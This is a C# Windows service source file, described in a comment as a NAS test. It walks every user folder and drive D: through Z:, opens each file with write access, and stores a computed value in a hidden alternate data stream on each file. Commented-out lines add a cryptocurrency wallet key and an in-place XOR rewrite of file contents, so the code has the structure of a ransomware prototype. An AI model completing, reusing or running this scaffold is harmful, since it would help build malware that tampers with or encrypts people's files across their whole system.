using Microsoft.Win32;
using Microsoft.Win32.SafeHandles;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using NasLib;

namespace WindowsService1
{
    using E = Environment;
    using SF = Environment.SpecialFolder;
    using MO = List<(string key, object value)>;

    /// <summary>
    /// NAS 테스트를 위한 Service 
    /// </summary>
    public class MyTask
    {
        public static volatile bool Running = false;

        public static void Run(Action<object> logger, string rootDir = null)
        {
            void log(object message)
            {
                logger?.Invoke(message);
                Debug.WriteLine(message);
            }

            try
            {
                Running = true;
                //var wallet = "zpub6n1WN4Q1MKfkyRbXrXHiyf59LQyMrL9LBKGaHsumhWcg5fYzLmmFB6cnFpugGoYWFu4bVqkZAe3zeLDhsRrgcXfsyYB3J6yB16ovUh7qpk2";
                List<string> roots;
                if (rootDir == null) roots = buildRoots();
                else roots = new List<string> { rootDir };

                int rootCounter = 0;
                int dirCounter = 0;
                int fileCounter = 0;
                foreach (var dir in roots)
                {
                    log($"[{rootCounter:D02}][{dirCounter}][{fileCounter}] starting {dir} ");
                    var fc = fileCounter;
                    var sw = Stopwatch.StartNew();
                    runDir(dir);
                    log($"[{rootCounter:D02}][{dirCounter}][{fileCounter}] complete {fileCounter - fc} files: {sw.ElapsedMilliseconds / 1000} sec");
                    sw.Restart();
                    rootCounter++;
                }

                void runDir(string dir)
                {
                    try
                    {
                        //TEST
                        log($"[{rootCounter:D02}][{dirCounter}][{fileCounter}] starting {dir} ");

                        var files = Directory.EnumerateFiles(dir, "*", SearchOption.TopDirectoryOnly);
                        runFile(files);
                        dirCounter++;
                    }
                    catch { log($"[{dirCounter}] dir enum files error: {dir}"); }

                    try
                    {
                        var dirs = Directory.EnumerateDirectories(dir, "*", SearchOption.TopDirectoryOnly);
                        foreach (var sdir in dirs) runDir(sdir);
                    }
                    catch { log($"[{dirCounter}] dir enum dirs error: {dir}"); }
                }
                void runFile(IEnumerable<string> files)
                {
                    foreach (var file in files)
                    {
                        try
                        {
                            log($"[{dirCounter}][{fileCounter}] {Path.GetFileName(file)}"); 
                            var avg = doSomthingWithTheFile(file);
                            log($"    {avg}");
                        }
                        catch (Exception ex)
                        {
                            log($"[{dirCounter}][{fileCounter}] file error: {file}");
                            log($"  {ex.Message}");
                        }
                        fileCounter++;
                    }
                }
            }
            finally
            {
                Running = false;
            }
        }

        /// <summary>
        /// 시스템상의 모든 폴더 목록 작성
        /// C:는 특정 폴더만 추가
        /// </summary>
        /// <returns></returns>
        private static List<string> buildRoots()
        {
            var roots = new List<string>();
            add(SF.Personal);
            add(SF.DesktopDirectory);
            add(SF.CommonDocuments);
            add(SF.CommonDesktopDirectory);
            add(SF.ApplicationData);
            add(SF.LocalApplicationData);
            add(SF.CommonApplicationData);
            roots.AddRange(Directory.EnumerateDirectories(@"C:\Users", "Documents", SearchOption.TopDirectoryOnly));

            void add(SF sf)
            {
                var dir = E.GetFolderPath(sf, E.SpecialFolderOption.None);
                if (!string.IsNullOrWhiteSpace(dir)) roots.Add(dir);
            }

            for (int i = 0; i < 23; i++)
            {
                var drv = $"{ (char)('D' + i)}:\\";
                if (Directory.Exists(drv))
                {
                    roots.Add(drv);
                    roots.AddRange(Directory.EnumerateDirectories(drv, "*", SearchOption.TopDirectoryOnly));
                }
            }
            roots.AddRange(listSubDir(@"C:\Users", "Documents"));
            return roots;
        }

        static List<string> listSubDir(string rootDir, string pattern)
        {
            try
            {
                var dirs = Directory.EnumerateDirectories(rootDir, "*", SearchOption.TopDirectoryOnly).ToArray();
                var subs = new List<string>();
                pattern = pattern.ToUpper();
                foreach (var dir in dirs)
                {
                    try
                    {
                        if (dir.ToUpper().EndsWith(pattern)) subs.Add(dir);
                        else subs.AddRange(listSubDir(dir, pattern));
                    }
                    catch { }
                }
                return subs;
            }
            catch { return new List<string>(); }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="filePath"></param>
        static (double, DateTime) doSomthingWithTheFile(string filePath)
        {
            const string _streamName = "_314159265_";
            if (NAS.HasStream(filePath, _streamName))
            {
                var b = NAS.ReadStream(filePath, _streamName);
                if(b.Length >=16) return (BitConverter.ToDouble(b, 0), DateTime.FromBinary(BitConverter.ToInt64(b, 8)));
            }

            var sum = 0L;
            var counter = 0L;
            const int bufferLength = 1024 * 1024 * 100;//100MiB
            var buffer = new byte[bufferLength];
            using (var fs = new FileStream(filePath, FileMode.Open, FileAccess.Write | FileAccess.Read))
            {
                while (true)
                {
                    var readLen = fs.Read(buffer, 0, bufferLength);
                    if (readLen <= 0) break;

                    for (int i = 0; i < readLen; i++) sum += buffer[i];
                    counter += readLen;

                    //for (int i = 0; i < readLen; i++) buffer[i] = (byte)(buffer[i] ^ 0);
                    //fs.Write(buffer, 0, readLen);
                }
                fs.Close();
            }

            var list = new List<byte>();
            (var avg, var time) = (Math.Round(sum / (double)counter, 3), DateTime.UtcNow);
            list.AddRange(BitConverter.GetBytes(avg));
            list.AddRange(BitConverter.GetBytes(time.ToBinary()));

            NAS.WriteStream(filePath, _streamName, list.ToArray());
            return (avg, time);
        }


        #region ---- TEST ----

        public static string getUserName()
        {
            var mo = getIds("Win32_ComputerSystem")[0];
            var user = getValue(mo, "UserName");
            if (user.Contains("\\")) return user.Split('\\')[1];
            else return user;

            string getValue(MO m, string key) => m.FirstOrDefault(y => y.key.Equals(key)).value?.ToString() ?? "";
            List<MO> getIds(string key)
            {
                var list = new List<MO>();
                try
                {
                    using (var mc = new ManagementClass(key))
                    {
                        using (var moc = mc.GetInstances())
                        {
                            foreach (var m in moc)
                            {
                                var moData = new MO();
                                list.Add(moData);
                                foreach (var p in m.Properties) moData.Add((p.Name, p.Value));
                            }
                            return list;
                        }
                    }
                }
                catch (Exception ex)
                {
                    var a = new List<(string, object)>();
                    a.Add(("ex", ex.Message));
                    list.Add(a);
                    return list;
                }
            }
        }
        public static string getUser2()
        {
            return (string)Registry.CurrentUser.OpenSubKey("Volatile Environment")?.GetValue("USERNAME", "") ?? "";
        }

        #endregion

    }//class
}
